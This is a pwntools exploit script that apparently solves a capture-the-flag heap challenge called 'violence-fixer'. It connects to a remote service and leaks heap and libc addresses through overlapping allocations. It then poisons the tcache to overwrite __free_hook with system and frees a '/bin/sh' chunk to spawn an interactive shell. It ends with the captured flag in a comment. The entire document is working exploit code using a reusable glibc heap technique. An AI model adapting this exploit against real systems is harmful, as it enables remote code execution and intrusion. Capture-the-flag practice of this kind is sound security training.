from pwn import *

HOST = "35.221.81.216"
PORT = 32112
elf = ELF('violence-fixer')
libc = ELF('libc.so.6')
p = remote(HOST, PORT)

p.sendlineafter(b'Are you beginner?: ', 'y')
prompt = '> '


def alloc(size, content):
    p.sendlineafter(prompt, '1')
    p.sendlineafter(b'size: ', str(size))
    p.sendafter(b'content: ', content)


def delegate(size, content):
    p.sendlineafter(prompt, '0')
    p.sendlineafter(b'Your really want to delegate malloc rihgt to arena???>', 'y')
    p.sendlineafter(b'size: ', str(size))
    p.sendafter(b'content: ', content)


def free(index):
    p.sendlineafter(prompt, '3')
    p.sendlineafter(b'index: ', str(index))


def show(index):
    p.sendlineafter(prompt, '2')
    p.sendlineafter('index: ', str(index))
    return p.recvuntil(b'\n')[:-1]


alloc(0x28, b'A' * 0x28)
alloc(0x28, b'B' * 0x28)
alloc(0x28, b'C' * 0x28)

free(1)
free(2)

payload = b''
payload += b'D' * 0x30
alloc(0x58, payload)
leaked = show(1)
heap_addr = u64(leaked.lstrip(payload).ljust(8, b'\0'))
heap_base = (heap_addr >> 12) << 12
log.success('heap_addr --> %s' % hex(heap_addr))
log.success('heap_base --> %s' % hex(heap_base))

alloc(0x28, b'E' * 0x28)

alloc(0x28, b'F' * 0x28)
alloc(0x28, b'F' * 0x28)
alloc(0x28, b'F' * 0x28)

free(3)
free(4)

alloc(0xf8, b'G' * 0x28 + p64(0x5d1 + 0x10))
for i in range(0x5):
    alloc(0xf8, b'F' * 0xf8)
payload = b''
payload += p64(0) + p64(0x151)
alloc(0xf8, payload)

free(5)

free(3)
free(4)
free(5)
free(6)
free(7)
free(8)
free(9)
free(1)
free(2)
free(0)
# free(10)

payload = b''
payload += b'A' * 0x20
alloc(0x58, payload)

leaked = show(0)
libc_addr = u64(leaked.lstrip(payload).ljust(8, b'\0'))
libc_base = libc_addr - 0x1ebbe0
log.success('libc_base --> %s' % hex(libc_base))

alloc(0x28, b'A' * 0x28)
alloc(0x28, b'A' * 0x28)

free(1)
free(2)

free_hook = libc.symbols['__free_hook'] + libc_base
alloc(0x28, p64(free_hook) + p64(free_hook))

alloc(0x28, b'/bin/sh'.ljust(0x28, b'\0'))

payload = b''
payload += p64(libc_base + libc.symbols['system'])
delegate(0x28, payload)

free(2)
p.interactive()

# FLAG --> TSG{dont_eat_your_pet_fish}
